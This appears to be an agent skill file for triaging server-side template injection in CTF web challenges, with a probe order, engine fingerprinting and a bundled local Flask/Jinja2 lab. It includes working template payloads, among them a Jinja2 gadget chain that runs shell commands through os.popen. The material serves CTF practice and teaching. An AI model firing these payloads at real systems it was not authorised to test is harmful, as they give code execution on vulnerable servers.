---
name: web-ssti-triage
description: Triage CTF web targets for server-side template injection. Use when user input appears inside rendered templates, reflected content evaluates arithmetic or object access, or the challenge hints at Jinja2/Twig/Freemarker-style template execution.
---

# Web SSTI Triage

Use this skill after `ctf-solver-profile` when evidence points to server-side template injection.

Treat it as a short SOP:

- confirm server-side expression evaluation with cheap probes
- fingerprint the likely template family
- read low-risk objects first
- escalate to file read or command execution only after the engine is clear

## Quick Start

Probe a target quickly:

```bash
python3 .claude/skills/web-ssti-triage/scripts/ssti_probe.py \
  --target http://127.0.0.1:5004/greet \
  --param name
```

Run the bundled lab:

```bash
cd targets/web-ssti-lab
docker compose up -d
```

Then confirm Jinja2 execution:

```bash
python3 .claude/skills/web-ssti-triage/scripts/ssti_probe.py \
  --target http://127.0.0.1:5004/greet \
  --param name \
  --show-bodies
```

If the probe output suggests Jinja2, verify object access with a low-risk read:

```bash
curl 'http://127.0.0.1:5004/greet?name={{config.FLAG}}'
```

## Workflow

1. Confirm the input is rendered server-side, not just reflected client-side.
2. Try a small arithmetic probe such as `{{7*7}}`.
3. Differentiate template families with a second probe such as `{{7*'7'}}` or `${7*7}`.
4. Read harmless objects first, for example `{{config.items()}}` or `{{config.FLAG}}`.
5. Only after the engine is clear, consider escalation to file read or command execution.
6. Save the case with `ctf-knowledge-capture`.

## Probe Order

Start with these in order:

1. `{{7*7}}`
2. `{{7*'7'}}`
3. `${7*7}`
4. `<%= 7*7 %>`

Interpret them like this:

- `{{7*7}} -> 49`: Jinja2/Twig/Nunjucks-style handling is plausible
- `{{7*'7'}} -> 7777777`: Jinja2 is likely
- `{{7*'7'}} -> 49`: Twig-style behavior is more likely
- `${7*7} -> 49`: Freemarker or EL-style handling is plausible
- `<%= 7*7 %> -> 49`: ERB/JSP-style handling is plausible

If probes are reflected literally, stop calling it SSTI and re-check whether the target is only doing HTML reflection.

## Jinja2 Escalation

Prefer this order:

1. `{{config.items()}}`
2. `{{config.FLAG}}`
3. `{{request.path}}`
4. `{{cycler.__init__.__globals__.os.popen('id').read()}}`

Rules:

- Read config or request objects before jumping to command execution.
- Do not start with long gadget chains.
- Preserve the exact payload that first proved code execution.

## Local Lab

Bundled lab:

- Path: `targets/web-ssti-lab/`
- Stack: Flask + Jinja2
- Endpoint: `http://127.0.0.1:5004/greet?name=guest`
- Goal: confirm SSTI and read `config.FLAG`

## Exit Conditions

Switch away from this skill when:

- probes are reflected literally with no server-side evaluation
- behavior fits client-side templating or DOM XSS better than SSTI
- the target looks more like source disclosure, SSRF, or file upload than a template sink
